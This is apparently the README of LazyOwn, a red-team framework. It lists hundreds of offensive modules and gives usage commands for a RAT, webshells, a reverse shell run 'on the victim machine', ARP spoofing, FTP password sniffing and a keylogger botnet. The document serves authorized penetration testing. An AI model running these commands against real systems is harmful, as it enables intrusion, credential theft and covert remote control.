## Requisitos

- Python 3.x
- Módulos de Python:
    - requests
    - python-libnmap
    - pwncat-cs
    - pwn
    - groq
    - PyPDF2
    - docx
    - python-docx
    - olefile
    - exifread
    - pycryptodome
    - impacket
    - pandas
    - colorama
    - tabulate
    - pyarrow
    - keyboard
    - flask-unsign
    - name-that-hash
    - certipy-ad
    - ast
    - pykeepass
    - cmd2
    - Pillow
    - netaddr
    - stix2
    - pyautogui

- `subprocess` (incluido en la biblioteca estándar de Python)
- `platform` (incluido en la biblioteca estándar de Python)
- `tkinter` (Opcional para el GUI)
- `numpy` (Opcional para el GUI)
-

## Uso

![image](https://github.com/user-attachments/assets/6ce124bf-035e-489a-9393-d2b0712b808c)


```sh
./run or ./fast_run_as_r00t.sh

./run --help
    [;,;] LazyOwn vvvrelease/0.2.8
    Usage: ./run [Options]
    Options:
      --help             Show this help panel.
      -v                 Show version.
      -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)
      -c <command>       Exec a command using LazyOwn example: ping
      --no-banner        No Banner
      -s                 Run as root
      --old-banner       Show old Banner


./fast_run_as_r00t.sh --vpn 1 (the number id of your file in vpn directory)
```

```
Use assign <parameter> <value> to configure parameters.
Use show to display the current parameter values.
Use run <script_name> to execute a script with the set parameters.
Use exit to exit the CLI.

Once the shell is running, you can use the following commands:

list: Lists all LazyOwn Modules.
assign <parameter> <value>: Sets the value of a parameter. For example, assign rhost 192.168.1.1.
show: Displays the current values of all parameters.
run <script>: Executes a specific script available in the framework.
Available Scripts

┌─[👤grisun0 (LazyOwn👽kali) ~/home/grisun0/LazyOwn][127.0.0.1][http://VariaType.htb] 🌐192.168.1.120 ✗ feature/lazyllmchat-assistant (🐍env)
└╼ $ help

01. Reconnaissance
──────────────────
alterx        finalrecon       ping             trace                  
apache_users  getcap           ports            trufflehog             
binarycheck   gospider         proxy            tshark_analyze         
cve           graudit          recon            waybackmachine         
dig           httprobe         serveralive2     whatweb                
dnschef       ipinfo           sherlock         windapsearchscrapeusers
dnsenum       launchpad        sslscan        
dnsmap        metabigor        tcpdump_capture
dnstool_py    openssl_sclient  tcpdump_icmp   

02. Scanning & Enumeration
──────────────────────────
ad_ldap_enum  enum4linux_ng     nbtscan              rpcdump             wpscan
allin         evil_ssdp         net_rpc_addmem       rpcmap_py         
amass         feroxbuster       netexec              samrdump          
arjun         finger_user_enum  netview              sawks             
arpscan       fuzz              nikto                sessionssh        
batchnmap     getnpusers        nmapscript           skipfish          
bbot          gobuster          nuclei               smbattack         
blazy         hound             odat                 smbclient         
bloodhound    kerbrute          openredirex          smbclient_impacket
breacher      lazynmap          osmedeus             smbclient_py      
certipy       ldapdomaindump    parsero              smbmap            
certipy_ad    ldapsearch        parth                smtpuserenum      
changeme      lookupsid         portdiscover         snmpcheck         
cme           lookupsid_py      portservicediscover  snmpwalk          
davtest       loxs              pre2k                swaks             
dirsearch     lynis             pykerbrute           vscan             
dmitry        magicrecon        rdp_check_py         wfuzz             
enum4linux    mqtt_check_py     rpcclient            windapsearch      

03. Exploitation
────────────────
aclpwn_py         gettgtpkinit_py  psexec            sqlmap                    
addspn_py         greatSCT         psexec_py         sqsh                      
autoblody         img2cookie       py3ttyup          ss                        
cacti_exploit     jwt_tool         pyautomate        sshexploit                
commix            krbrelayx_py     pyoracle2         template_helper_serializer
cp                kusa             pywhisker         ticketer                  
createcookie      lazypwn          rejetto_hfs_exec  unicode_WAFbypass         
createdll         lfi              rev               upload_bypass             
digdug            lol              seo               utf                       
download_exploit  ms08_067_netapi  sharpshooter      winbase64payload          
downloader        ntpdate          shellfire         wrapper                   
eternal           owneredit        shellshock        www                       
excelntdonut      padbuster        sireprat          xss                       
filtering         powerserver      sqli              xsstrike                  
gets4uticket_py   printerbug_py    sqli_mssql_test 

04. Post-Exploitation
─────────────────────
add2find                     exe2bin              pezorsh              
adversary                    exe2donutbin         pip_proxy            
adversary_yaml               extract_yaml         pip_repo             
aes_pe                       find                 powershell_cmd_stager
ai_playbook                  follina              rmfromfind           
apt_proxy                    hex2shellcode        rubeus               
apt_repo                     internet_proxy       scavenger            
atomic_lazyown               issue_command_to_c2  scp                  
bin2shellcode                lazywebshell         service_ssh          
convert_remcomsvc_from_file  mimikatzpy           sessionsshstrace     
cports                       msfshellcoder        shellcode            
create_synthetic             ofuscate_string      shellcode2elf        
createpayload                ofuscatesh           shellcode2sylk       
d3monizedshell               ofuscatorps1         shellcode_search     
disableav                    path2hex             ssh_cmd              

05. Persistence
───────────────
asprevbase64       ftp                msfpc                 setoolKits
backdoor_factory   generate_revshell  paranoid_meterpreter  ssh       
conptyshell        grisun0            pwncat                toctoc    
createrevshell     grisun0w           pwncatcs              veil      
createwebshell     ivy                rdp                   weevely   
createwinrevshell  knokknok           revwin                weevelygen
darkarmour         listener_go        scarecrow           
dr0p1t             listener_py        service             

06. Privilege Escalation
────────────────────────
responder  smbserver

07. Credential Access
─────────────────────
addusers                cred          john2hash        rocky           
adsso_spray             creds_py      john2keepas      searchhash      
cewl                    crunch        john2zip         smalldic        
crack_cisco_7_password  cubespraying  keepass          spraykatz       
createcredentials       dacledit      medusa           sshkey          
createhash              generatedic   passtightvnc     sudo            
createmail              hashcat       passwordspray    transform       
createusers_and_hashs   hydra         refill_password  username_anarchy

08. Lateral Movement
────────────────────
addcli     id_rsa           penelope         sshd               wifipass  
bloodyAD   lateral_mov_lin  regeorg          stormbreaker       wmiexec   
chisel     ligolo           rnc              targetedKerberoas  wmiexecpro
dcomexec   mssqlcli         set_proxychains  tord             
getTGT     nc               shadowsocks      upload_c2        
gospherus  ngrok            socat            vpn              

09. Data Exfiltration
─────────────────────
adgetpass    dploot    evilwinrm     getuserspns  reg_py    secretsdump  
decrypt      encrypt   getadusers    gitdumper    rsync     unzip        
download_c2  evidence  getnthash_py  gmsadumper   samdump2  upload_gofile

10. Command & Control
─────────────────────
atomic_agent  automsf     emp3r0r                mitre_test   sliver_server
atomic_gen    c2          empire                 msf        
atomic_tests  caldera     generate_playbook      msfrpc     
attack_plan   duckyspark  iis_webdav_upload_asp  my_playbook

11. Reporting
─────────────
apropos                  createtargets          gpt             process_scans
banners                  download_malwarebazar  groq            pth_net      
c2asm                    extract_ports          img2vid         pup          
camphish                 eyewitness             malwarebazar    vulns        
create_session_json      eyewitness_py          morse         
createjsonmachine        get_avaible_actions    name_the_hash 
createjsonmachine_batch  gowitness              nmapscripthelp

12. Miscellaneous
─────────────────
acknowledgearp   clone_site          getseclist        links         run      
acknowledgeicmp  cron                graph             list          sh       
addhosts         decode              h                 load_session  show     
aliass           download_resources  hex_to_plaintext  nano          sys      
assign           encode              ignorearp         news          tab      
banner           encoderpayload      ignoreicmp        payload       urldecode
base64decode     encodewinbase64     ip                pwd           urlencode
base64encode     exit                ip2asn            qa            v        
check_update     fixel               ip2hex            rhost       
clean            fixperm             kick              rot         
clock            gencert             lazyscript        rotf        

13. Lua Plugin
──────────────
generate_c_reverse_shell          lolbas_certutil_download_exec
generate_cleanup_commands         lolbas_certutil_exe          
generate_html_payload             lolbas_mshta_js              
generate_lateral_command          lolbas_mshta_reverse_shell   
generate_linux_asm_reverse_shell  lolbas_rundll32_dll          
generate_linux_raw_shellcode      lolbas_wmic_xsl_execution    
generate_lolbird                  parse_nmap_with_xmlstarlet   
generate_msfvenom_loader          run_nuclei_on_nmap_files     
generate_msfvenom_loader_windows  run_python_rev_c2            
generate_reverse_shell            rundll32_sct_from_url        
generate_stub                     validate_shellcode           
kerberos_harvest                  visualize_network            
lolbas_bitsadmin_exe            

14. Yaml Addon.
───────────────
AdaptixC2                 GoPEInjection      OverRide
agentzero                 gosearch           peeko
argfuscator               gui                pretender
ATTPwn                    gui2               PTMultiTools
AuroraPatch               hack_browser_data  PTMultiTools_scan
banner_tool               hellbird           PyinMemoryPE
bbr                       hive               pyrit
beacon                    hooka_linux_amd64  raven
blacksandbeacon           hostdiscover       ridenum
blacksandbeacon_bof       kivi_revshell      setoolkit
cgoblin_windows           laps               ShadowLink
Clematis                  lazyaddon_creator  shellcode_custom_win_rev_tcp_xored
commix2                   lazyagentAi        SigPloit
copy-fail-CVE-2026-31431  lazybinenc         spoonmap
CVE-2022-22077            lazyftpsniff       stratus_detonate
CVE_2025_24071_PoC        LazyLoader         stratus_list
demiguise                 lazymapd           toposwarm
ebird3                    lazyownbt          unicorn
evilginx2                 LazyOwnExplorer    upxdump
gcr                       llm                vulnbot
gemini-cli                NullGate           vulnbot_groq
gen_dll_rev               oniux              vulnhuntr
Get_ReverseShell          opencode_adapter   watchguard
githubot                  orpheus            wspcoerce
gomulti_loader_linux
gomulti_loader_windows

15. Adversary YAML.
───────────────────
amsi_c            implant_nim_nim  infect_c     pid_c  
implant_crypt_go  implant_rust_rs  persist_ps1  shell_c

16. Artificial Intelligence
───────────────────────────
ai_toggle

Uncategorized Commands
──────────────────────
addalias          gobuster_dns   ipy             ollama_enum   set          
alias             gobuster_http  listaliases     pop           shell        
edit              gobuster_web   macro           quit          shortcuts    
EOF               help           nikto_host      rrhost        subwfuzz_tool
ffuf_enumeration  history        notify          run_pyscript
ffuf_tool         ipp            nuclei_ad_http  run_script  

┌─[👤grisun0 (LazyOwn👽kali) ~/home/grisun0/LazyOwn][127.0.0.1][http://VariaType.htb] 🌐192.168.1.120 ✗ feature/lazyllmchat-assistant (🐍env)
└╼ $ 


```

## Tag in youtube
<https://www.youtube.com/hashtag/lazyown>

## Podcast
<https://www.youtube.com/watch?v=m4FtlhownvM&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ>

## DeepWiki
<https://deepwiki.com/grisuno/LazyOwn/>


```sh
LazyOwn> assign binary_name my_binary
LazyOwn> assign rhost 192.168.1.100
LazyOwn> assign api_key my_api_key
LazyOwn> run lazysearch
LazyOwn> run lazynmap
LazyOwn> exit
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)

For searching within the scraped database obtained from GTFOBins.

```sh
python3 lazysearch.py binario_a_buscar
```

## Searches with GUI
Additional Features and Enhancements:
AutocompleteEntry:

A filter has been added to remove None values from the autocomplete list.
New Attack Vector:

A "New Attack Vector" button has been added to the main interface.
Functionality has been implemented to add a new attack vector and save the updated data in Parquet files.
Export to CSV:

A "Export to CSV" button has been added to the main interface.
Functionality has been implemented to export DataFrame data to a user-selected CSV file.
Usage:

Add a New Attack Vector: Click the "New Attack Vector" button, fill in the fields, and save.
Export to CSV: Click the "Export to CSV" button and select the location to save the CSV file.
New Function scan_system_for_binaries:

Implements system-wide binary searches using the file command to determine if a file is binary.
Uses os.walk to traverse the file system.
Results are displayed in a new window within the GUI.
Button to Search for Binaries:

A "Search System for Binaries" button has been added to the main interface, which calls the scan_system_for_binaries function.
Note:

The is_binary function uses the Unix file command to determine if a file is a binary executable. If you are on a different operating system, you will need to adjust this method for compatibility.
This implementation can be resource-intensive as it traverses the entire file system. You may consider adding additional options to limit the search to specific directories or filter for certain file types.

```sh
python3 LazyOwnExplorer.py
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)



```sh
python3 lazyown.py
```

If you want to update, we proceed as follows:

```sh
cd LazyOwn
rm parquets/*.csv
rm parquets/*.parquet
./update_db.sh
```

## Use mode LazyOwn WebShells

LazyOwn Webshell Collection is a collection of webshells for our framework, which allows us to establish a webshell on the machine where we run LazyOwn using various programming languages. Essentially, LazyOwn Webshell raises a web server within the modules directory, making it accessible via a web browser. This allows us to both make the modules available separately through the web and access the cgi-bin directory, where there are four shells: one in Bash, another in Perl, another in Python, and one in ASP, in case the target is a Windows machine.

```sh
lazywebshell
```

y listo ya podemos acceder a cualquiera de estas url:

<http://localhost:8080/cgi-bin/lazywebshell.sh>

<http://localhost:8080/cgi-bin/lazywebshell.py>

<http://localhost:8080/cgi-bin/lazywebshell.asp>

<http://localhost:8080/cgi-bin/lazywebshell.cgi>

![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)

## Use Lazy MSFVenom to Reverse Shell

    Executes the `msfvenom` tool to generate a variety of payloads based on user input.

    This function prompts the user to select a payload type from a predefined list and runs the corresponding
    `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
    payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

    The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
    the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
    the function will also sign the APK and perform necessary post-processing steps.

    :param line: Command line arguments for the script.
    :return: None

```sh
run lazymsfvenom or venom
```
## Command & Control System
The Command & Control (C2) system enables remote operations through a server-client architecture with encrypted communications.

![image](https://github.com/user-attachments/assets/fe1bd558-8589-4d86-9d4b-c07118d2f119)


## Use Lazy PATH Hijacking

A file will be created in /tmp with the name binary_name set in the payload, initialized with gzip in memory, and using bash in the payload. To set the payload from the JSON, use the payload command to execute. Use:

```sh
lazypathhijacking
```

## Use mode LazyOwn RAT

![image](https://github.com/user-attachments/assets/b0653dd9-6a4f-42b5-b565-0ec4943acd69)


LazyOwn RAT is a simple yet powerful Remote Administration Tool. It features a screenshot function that captures the server's screen, an upload command that allows us to upload files to the compromised machine, and a C&C mode where commands can be sent to the server. It operates in two modes: client mode and server mode. There is no obfuscation, and the RAT is based on BasicRat. You can find it on GitHub at https://github.com/awesome-security/basicRAT and at https://github.com/hash3liZer/SillyRAT. Although the latter is much more comprehensive, I just wanted to implement screenshot capture, file uploads, and command sending. Perhaps in the future, I will add webcam viewing functionality, but that will come later.

```sh
usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
lazyownserver.py: error: the following arguments are required: --key

usage: lazyownclient.py [-h] --host HOST --port PORT --key KEY
lazyownclient.py: error: the following arguments are required: --host, --port, --key

LazyOwn> run lazyownclient
[?] lhost and lport and rat_key must be set

LazyOwn> run lazyownserver
[?] rhost and lport and rat_key must be set

luego los comandos son:

upload /path/to/file
donwload /path/to/file
screenshot
sysinfo
fix_xauth #to fix xauth xD
lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 ready to C&C
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)

## Use mode Lazy Meta Extract0r

LazyMeta Extract0r is a tool designed to extract metadata from various types of files, including PDF, DOCX, OLE files (such as DOC and XLS), and several image formats (JPG, JPEG, TIFF). This tool will traverse a specified directory, search for files with compatible extensions, extract the metadata, and save it to an output file.

[*] Iniciando: LazyMeta extract0r [;,;]

usage: lazyown_metaextract0r.py [-h] --path PATH
lazyown_metaextract0r.py: error: the following arguments are required: --path

```sh
python3 lazyown_metaextract0r.py --path /home/user
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)

## Use mode decrypt encrypt

A encryption method that allows us to both encrypt files and decrypt them if we have the key, of course.

![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)

```sh
encrypt path/to/file key # to encrypt
decrypt path/to/file.enc key #to decrypt
```

## Uso modo LazyNmap

![image](https://github.com/user-attachments/assets/89965c9e-836e-4402-9d0b-cb9d13bb9a26)


The use of Lazynmap provides us with an automated script for a target, in this case, 127.0.0.1, using Nmap. The script requires administrative permissions via sudo. It also includes a network discovery module to identify what is present in the IP segment you are in. Additionally, the script can now be called without parameters using the alias nmap or with the command run lazynmap.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)

```sh
./lazynmap.sh -t 127.0.0.1 # or in the cli just nmap
```

## Usage of LazyOwn GPT One Liner CLI Assistant and Researcher

Discover the revolution in automating pentesting tasks with the LazyOwn GPT One Liner CLI Assistant! This incredible script is part of the LazyOwn tool suite, designed to make your life as a pentester more efficient and productive.

Key Features:

Intelligent Automation: Leverages the power of Groq and advanced natural language models to generate precise and efficient commands based on your specific needs.
User-Friendly Interface: With a simple prompt, the assistant generates and executes one-liner scripts, drastically reducing the time and effort involved in creating complex commands.
Continuous Improvement: Continuously transforms and optimizes its knowledge base to provide you with the best solutions, adapting to each situation.
Simplified Debugging: Enable debug mode to obtain detailed information at every step, facilitating the identification and correction of errors.
Seamless Integration: Works effortlessly within your workspace, harnessing the power of the Groq API to deliver quick and accurate responses.
Security and Control:

Safe Error Handling: Intelligently detects and responds to execution errors, ensuring you maintain full control over each generated command.
Controlled Execution: Before executing any command, it requests your confirmation, giving you peace of mind knowing exactly what is being executed on your system.
Easy Configuration:

Set up your API key in seconds and start enjoying all the benefits offered by the LazyOwn GPT One Liner CLI Assistant. A quick start guide is available to help you configure and maximize the potential of this powerful tool.

Ideal for Pentesters and Developers:

Optimize Your Processes: Simplify and accelerate command generation in your security audits.
Continuous Learning: The knowledge base is constantly updated and improved, always providing you with the latest best practices and solutions.
With the LazyOwn GPT One Liner CLI Assistant, transform the way you work, making it faster, more efficient, and secure. Stop wasting time on repetitive and complex tasks, and focus on what truly matters: discovering and resolving vulnerabilities!

Join the pentesting revolution with LazyOwn and take your productivity to the next level!

[?] Usage: python lazygptcli.py --prompt "<your prompt>" [--debug]

[?] Options:

--prompt "The prompt for the programming task (required)."
--debug, -d "Enables debug mode to display debug messages."
--transform "Transforms the original knowledge base into an enhanced base using Groq."
[?] Ensure you configure your API key before running the script:
export GROQ_API_KEY=<your_api_key>
[->] Visit: https://console.groq.com/docs/quickstart (not a sponsored link)

Requirements:

Python 3.x
A valid Groq API key
Steps to Obtain the Groq API Key:
Visit Groq Console (https://console.groq.com/docs/quickstart) to register and obtain an API key.
```sh
export GROQ_API_KEY=<tu_api_key>
python3 lazygptcli.py --prompt "<tu prompt>" [--debug]
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)

## Usage of lazyown_bprfuzzer.py

Provide the arguments as specified by the script's requests: The script will require the following arguments:



usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                   [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]
--url: The URL to which the request will be sent (required).
--method: The HTTP method to use, such as GET or POST (optional, default: GET).
--headers: The request headers in JSON format (optional, default: {}).
--params: The URL parameters in JSON format (optional, default: {}).
--data: The form data in JSON format (optional, default: {}).
--json_data: The JSON data for the request in JSON format (optional, default: {}).
--proxy_port: The port for the internal proxy (optional, default: 8080).
-w, --wordlist: The path to the wordlist for fuzzing mode (optional).
-hc, --hide_code: The HTTP status code to hide in the output (optional).
Make sure to provide the required arguments to ensure the script runs correctly.
```sh
python3 lazyown_bprfuzzer.py --url "http://example.com" --method POST --headers '{"Content-Type": "LAZYFUZZ"}'
```

Form 2: Advanced Usage

If you wish to take advantage of the advanced features of the script, such as request replay or fuzzing, follow these steps:

Request Replay:

To utilize the request replay functionality, provide the arguments as indicated earlier.
During execution, the script will ask if you want to repeat the request. Enter 'y' to repeat or 'n' to terminate the repeater.
Fuzzing:

To use the fuzzing functionality, make sure to provide a wordlist with the -w or --wordlist argument.
The script will replace the word LAZYFUZZ in the URL and other data with the words from the provided wordlist.
During execution, the script will display the results of each fuzzing iteration.
These are the basic and advanced ways to use the lazyburp.py script. Depending on your needs, you can choose the method that best fits your specific situation.

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
    -hc 501
```

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \

```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
Note: To use the dictionary, run the following command within /usr/share/seclists:

```sh
now the command 'getseclist' do that automated.
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
&& unzip SecList.zip \
&& rm -f SecList.zip
```

## Usage of LazyOwn FTP Sniff Mode

This module is used to search for passwords on FTP servers across the network. Some may say that FTP is no longer used, but you would be surprised at the critical infrastructure environments I've seen with massive FTP services running on their servers. :)

```sh
assign device eth0
run lazyftpsniff
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859)

## Uso modo LazyReverseShell

Listen

```sh
nc -nlvp 1337 #o el puerto que escojamos
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)

para luego en la maquina victima

```sh
./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)

## Usage of Lazy Curl to Recon Mode

The module is located in the modules directory and is used as follows:

```sh
chmod +x lazycurl.sh
```

and then

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

Usage.

GET:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

POST:

```sh
./lazycurl.sh --mode POST --url http://10.10.10.10 --data "param1=value1&param2=value2"
```

TRACE:

```sh
./lazycurl.sh --mode TRACE --url http://10.10.10.10
```sh

File upload:

```sh
./lazycurl.sh --mode UPLOAD --url http://10.10.10.10 --file file.txt
```

wordlist bruteforce mode:

```sh
./lazycurl.sh --mode BRUTE_FORCE --url http://10.10.10.10 --wordlist /usr/share/wordlists/rockyou.txt
```

Make sure to adjust the parameters according to your needs and that the values you provide for the options are valid for each case.

## Usage of ARPSpoofing Mode

The script provides an ARP spoofing attack using Scapy. In the payload, you must set the lhost, rhost, and the device that you will use to perform the ARP spoofing.

```sh
assign rhost 192.168.1.100
assign lhost 192.168.1.1
assign device eth0
run lazyarpspoofing
```

## Usage of LazyGathering Mode

This script provides an X-ray view of the system in question where the tool is being executed, offering insights into its configuration and state.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)

```sh
run lazygath
```

## Usage of Lazy Own LFI RFI 2 RCE Mode

The LFI RFI 2 RCE mode is designed to test some of the more well-known payloads against the parameters specified in payload.json. This allows for a comprehensive assessment of Local File Inclusion (LFI), Remote File Inclusion (RFI), and Remote Code Execution (RCE) vulnerabilities in the target system.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)

```sh
payload
run lazylfi2rce
```





### Usage of LazyOwn Sniffer Mode

<https://www.youtube.com/watch?v=_-DDiiMrIlE>

The sniffer mode allows capturing network traffic through interfaces using the `-i` option, which is mandatory. There are many other optional settings that can be adjusted as needed.

#### Usage
```bash
usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
lazysniff.py: error: the following arguments are required: -i/--interface


![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)

To use the sniffer from the framework, you must configure the device with the command:

```sh
run lazysniff
or just
sniff
```

### Experimental Obfuscation Using PyInstaller

This feature is in experimental mode and does not work fully due to a path issue. Soon, it will support obfuscation using PyInstaller.


```sh
./py2el.sh
```

## Experimental NetBIOS Exploit

This feature is in experimental mode as it is not functioning yet... (coming soon, possibly an implementation of EternalBlue among other things...)


```sh
run lazynetbios
```

## Experimental LazyBotNet with Keylogger for Windows and Linux

This feature is in experimental mode, and the decryption of the keylogger logs is not functioning xD. Here we see for the first time in action the `payload` command, which sets all the configuration in our `payload.json`, allowing us to preload the configuration before starting the framework.


```sh
payload
run lazybotnet
```

## Interactive Menus

The script features interactive menus to select actions to be performed. In server mode, it displays relevant options for the victim machine, while in client mode, it shows options relevant to the attacking machine.

### Clean Interruption

The script handles the SIGINT signal (usually generated by Control + C) to exit cleanly.

## Abstract

LazyOwn is a framework that streamlines its workflow and automates many tasks and tests through aliases and various tools, functioning like a Swiss army knife with multipurpose blades for hacking xD.

## Lazyducky_digispark

![LazyOwn](https://github.com/user-attachments/assets/b7e8c257-c0de-4033-bf4b-57ebc87dcb97)

      Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.

        This method checks if Arduino CLI and Micronucleus are installed on the system.
        If they are not available, it installs them. It then compiles a Digispark sketch
        and uploads the generated .hex file to the Digispark device.

        The method performs the following actions:
        1. Checks for the presence of Arduino CLI and installs it if not available.
        2. Configures Arduino CLI for Digispark if not already configured.
        3. Generates a reverse shell payload and prepares the sketch for Digispark.
        4. Compiles the prepared Digispark sketch using Arduino CLI.
        5. Checks for the presence of Micronucleus and installs it if not available.
        6. Uploads the compiled .hex file to the Digispark device using Micronucleus.

        Args:
            line (str): Command line input provided by the user, which may contain additional parameters.

        Returns:
            None: The function does not return any value but may modify the state of the system
                by executing commands.


# Documentation by readmeneitor.py

Documentation automatically created by the script `readmeneitor.py` created for this project; maybe one day it will have its own repo, but for now, I don't see it as necessary.

## ReadMenator now have a repository

[https://github.com/grisuno/ReadMenator](https://github.com/grisuno/ReadMenator)

# Legal disclaimer:
Usage of LazyOwn RedTeam Framework for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.


---
